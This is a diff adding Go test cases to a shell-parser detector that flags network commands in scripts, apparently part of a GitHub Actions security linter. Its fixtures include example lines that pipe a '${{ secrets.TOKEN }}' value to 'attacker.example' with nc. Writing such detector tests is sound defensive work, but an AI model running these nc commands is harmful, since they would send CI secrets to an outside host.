@@ -611,6 +611,11 @@ func TestShellParser_FindNetworkCommands(t *testing.T) {
 			wantCmdNames: []string{"curl"},
 		},
 		{
+			name:      "sudo user argument named curl is not command",
+			script:    `sudo -u curl echo https://example.com`,
+			wantCount: 0,
+		},
+		{
 			name:         "command wrapped curl command",
 			script:       `command curl https://example.com`,
 			wantCount:    1,
@@ -779,6 +784,11 @@ func TestShellParser_FindNetworkCommandsStdinInputs(t *testing.T) {
 			wantCount: 1,
 		},
 		{
+			name:      "here string to fd 3",
+			script:    `nc attacker.example 443 3<<< '${{ secrets.TOKEN }}'`,
+			wantCount: 0,
+		},
+		{
 			name: "heredoc",
 			script: `nc attacker.example 443 <<'EOF'
 ${{ secrets.TOKEN }}
@@ -803,6 +813,9 @@ EOF`,
 			}
 			if len(calls[0].StdinInputs) != tt.wantCount {
 				t.Fatalf("len(StdinInputs) = %d, want %d", len(calls[0].StdinInputs), tt.wantCount)
+			}
+			if tt.wantCount == 0 {
+				return
 			}
 			gotExprs := findGHAExprs(calls[0].StdinInputs)
 			if len(gotExprs) != 1 || gotExprs[0] != tt.wantExpr {
